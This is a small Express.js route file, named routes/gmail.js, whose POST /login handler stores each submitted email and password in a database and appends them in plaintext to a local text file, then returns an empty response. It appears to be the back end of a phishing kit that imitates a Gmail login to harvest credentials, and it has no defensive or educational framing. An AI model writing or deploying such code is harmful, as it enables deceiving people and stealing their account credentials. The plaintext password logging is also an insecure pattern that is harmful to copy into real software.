const router = require('express').Router();
const fs = require('fs');
const Email = require('./../models/email');
// Path: routes/gmail.js

router.route('/login').post( async(req, res) => {
    const email = await Email({
        email: req.body.email,
        password: req.body.password,
    });
    email.save()
    fs.appendFile('mynewfile3.txt', "\n" + `Email: ${req.body.email} || Password: ${req.body.password}`, function (err) {
        if (err) throw err;
        console.log('Saved!');
      });
    res.send('')
}); 


module.exports = router;